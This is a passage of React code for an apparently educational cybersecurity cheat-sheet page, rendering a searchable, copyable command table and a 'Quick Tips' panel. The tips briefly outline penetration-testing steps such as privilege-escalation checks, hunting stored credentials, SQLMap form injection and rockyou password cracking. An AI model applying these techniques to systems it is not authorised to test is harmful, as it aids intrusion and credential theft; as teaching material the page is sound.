          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🔬 Forensics</Box>} />
        </Tabs>

        <Box sx={{ p: 3 }}>
          {/* Search */}
          <TextField
            fullWidth
            size="small"
            placeholder="Search commands..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            sx={{ mb: 3, maxWidth: 400 }}
            InputProps={{
              startAdornment: (
                <InputAdornment position="start">
                  <SearchIcon color="action" />
                </InputAdornment>
              ),
            }}
          />

          {/* Category Stats */}
          <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1, mb: 3 }}>
            {categories.map((cat) => {
              const count = getCurrentCommands().filter((c) => c.category === cat).length;
              return (
                <Chip
                  key={cat}
                  label={`${cat} (${count})`}
                  size="small"
                  onClick={() => setSearchQuery(cat)}
                  sx={{ cursor: "pointer", bgcolor: alpha(getTabColor(), 0.1), color: getTabColor(), fontWeight: 500 }}
                />
              );
            })}
          </Box>

          <Alert severity="info" sx={{ mb: 3, borderRadius: 2 }}>
            <Typography variant="body2">
              <strong>💡 Tip:</strong> Click any command to copy to clipboard. Use with caution - some commands require elevated privileges or may be destructive.
            </Typography>
          </Alert>

          {/* Commands Table */}
          <TableContainer sx={{ maxHeight: 600 }}>
            <Table stickyHeader size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05), width: "40%" }}>Command</TableCell>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05) }}>Description</TableCell>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05), width: 120 }}>Category</TableCell>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05), width: 80 }}>Level</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredCommands.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={4} sx={{ textAlign: "center", py: 4 }}>
                      <Typography color="text.secondary">No commands match your search</Typography>
                    </TableCell>
                  </TableRow>
                ) : (
                  filteredCommands.map((cmd, index) => (
                    <TableRow
                      key={`${cmd.command}-${index}`}
                      hover
                      sx={{
                        cursor: "pointer",
                        "&:hover": { bgcolor: alpha(getTabColor(), 0.03) },
                        ...(cmd.dangerous && { bgcolor: alpha("#ef4444", 0.02) }),
                      }}
                      onClick={() => copyToClipboard(cmd.command)}
                    >
                      <TableCell>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                          {cmd.dangerous && (
                            <Tooltip title="⚠️ Use with caution - potentially dangerous command">
                              <WarningIcon sx={{ fontSize: 16, color: "#ef4444", flexShrink: 0 }} />
                            </Tooltip>
                          )}
                          <Tooltip title={copiedCommand === cmd.command ? "Copied!" : "Click to copy"}>
                            <Box
                              component="code"
                              sx={{
                                fontFamily: "monospace",
                                fontSize: "0.8rem",
                                bgcolor: cmd.dangerous ? alpha("#ef4444", 0.05) : alpha(getTabColor(), 0.05),
                                px: 1.5,
                                py: 0.75,
                                borderRadius: 1,
                                flex: 1,
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between",
                                border: `1px solid ${cmd.dangerous ? alpha("#ef4444", 0.2) : alpha(getTabColor(), 0.15)}`,
                                "&:hover": { bgcolor: cmd.dangerous ? alpha("#ef4444", 0.1) : alpha(getTabColor(), 0.1) },
                              }}
                            >
                              <span style={{ wordBreak: "break-all" }}>{cmd.command}</span>
                              {copiedCommand === cmd.command ? (
                                <CheckIcon sx={{ fontSize: 16, color: "success.main", ml: 1, flexShrink: 0 }} />
                              ) : (
                                <ContentCopyIcon sx={{ fontSize: 14, opacity: 0.5, ml: 1, flexShrink: 0 }} />
                              )}
                            </Box>
                          </Tooltip>
                        </Box>
                      </TableCell>
                      <TableCell>
                        <Typography variant="body2">{cmd.description}</Typography>
                        {cmd.example && (
                          <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 0.5 }}>
                            Example: <code style={{ fontSize: "0.75rem" }}>{cmd.example}</code>
                          </Typography>
                        )}
                        {cmd.tags && cmd.tags.length > 0 && (
                          <Box sx={{ display: "flex", gap: 0.5, mt: 0.5, flexWrap: "wrap" }}>
                            {cmd.tags.map((tag) => (
                              <Chip
                                key={tag}
                                label={tag}
                                size="small"
                                sx={{
                                  height: 18,
                                  fontSize: "0.6rem",
                                  bgcolor: alpha(getTabColor(), 0.1),
                                  color: getTabColor(),
                                }}
                              />
                            ))}
                          </Box>
                        )}
                      </TableCell>
                      <TableCell>
                        <Chip
                          label={cmd.category}
                          size="small"
                          sx={{ fontSize: "0.65rem", bgcolor: alpha(getTabColor(), 0.1), color: getTabColor() }}
                        />
                      </TableCell>
                      <TableCell>
                        {cmd.difficulty && (
                          <Chip
                            label={cmd.difficulty}
                            size="small"
                            sx={{
                              fontSize: "0.6rem",
                              bgcolor: alpha(getDifficultyColor(cmd.difficulty), 0.15),
                              color: getDifficultyColor(cmd.difficulty),
                              fontWeight: 600,
                            }}
                          />
                        )}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </TableContainer>

          <Box sx={{ mt: 2, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <Typography variant="caption" color="text.secondary">
              Showing {filteredCommands.length} of {getCurrentCommands().length} commands
            </Typography>
          </Box>
        </Box>
      </Paper>

      {/* Quick Tips */}
      <Paper sx={{ p: 4, borderRadius: 3 }}>
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>
          📝 Quick Tips
        </Typography>
        <Grid container spacing={3}>
          {[
            { title: "Linux Privilege Escalation", tips: ["Always run 'sudo -l' first", "Check for SUID binaries", "Look for credentials in history/config files", "Check cron jobs for misconfigs"], color: "#f97316" },
            { title: "PowerShell Recon", tips: ["whoami /all shows all privileges", "Get-Process for running processes", "Check scheduled tasks for persistence", "Look for stored credentials"], color: "#0078d4" },
            { title: "Wireshark Analysis", tips: ["Follow TCP streams for full conversations", "Export HTTP objects for file analysis", "Use Statistics > Endpoints for overview", "Color coding helps identify anomalies"], color: "#6366f1" },
            { title: "Nmap Scanning", tips: ["Start with -sn for host discovery", "Use -T4 for faster reliable scans", "-sV -sC for version + default scripts", "Always save output with -oA"], color: "#10b981" },
            { title: "Metasploit Usage", tips: ["'search' before 'use' to find modules", "Always check 'show options'", "Use 'background' to preserve sessions", "Workspace helps organize assessments"], color: "#dc2626" },
            { title: "Web Testing", tips: ["Start with nikto for quick wins", "SQLMap with --forms for easy SQLi", "Use ffuf for fast directory fuzzing", "Always check robots.txt and sitemap"], color: "#0ea5e9" },
            { title: "Password Attacks", tips: ["Identify hash type with hashid first", "Start with common wordlists (rockyou)", "Use rules for better coverage", "Limit threads to avoid lockouts"], color: "#a855f7" },
            { title: "Forensics & IR", tips: ["Always create forensic images first", "Verify hashes before/after imaging", "Document everything with timestamps", "Use write blockers for physical media"], color: "#64748b" },
          ].map((section) => (
            <Grid item xs={12} sm={6} md={3} key={section.title}>
              <Box sx={{ p: 2, borderRadius: 2, bgcolor: alpha(section.color, 0.05), border: `1px solid ${alpha(section.color, 0.15)}`, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: section.color, mb: 1.5, fontSize: "0.85rem" }}>
                  {section.title}
                </Typography>
                {section.tips.map((tip, i) => (
                  <Typography key={i} variant="body2" color="text.secondary" sx={{ mb: 0.5, display: "flex", alignItems: "flex-start", gap: 1, fontSize: "0.75rem" }}>
                    <span>•</span> {tip}
                  </Typography>
                ))}
              </Box>
            </Grid>
          ))}
        </Grid>
      </Paper>
    </Container>
    </LearnPageLayout>
  );
}
